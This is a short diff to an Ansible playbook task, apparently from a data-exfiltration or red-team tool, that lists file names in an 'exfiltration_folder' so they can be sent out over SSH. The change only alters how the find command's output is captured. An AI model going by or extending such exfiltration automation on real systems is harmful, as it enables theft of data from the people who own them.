@@ -17,7 +17,7 @@
       
     - name: Grab files names form exfiltration_folder and exfl over SSH
       tags: SSH
-      shell: find . -maxdepth 1 -type f | cut -d'/' -f2 > /tmp/list
+      shell: "find . -maxdepth 1 -type f | cut -d'/' -f2"
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files
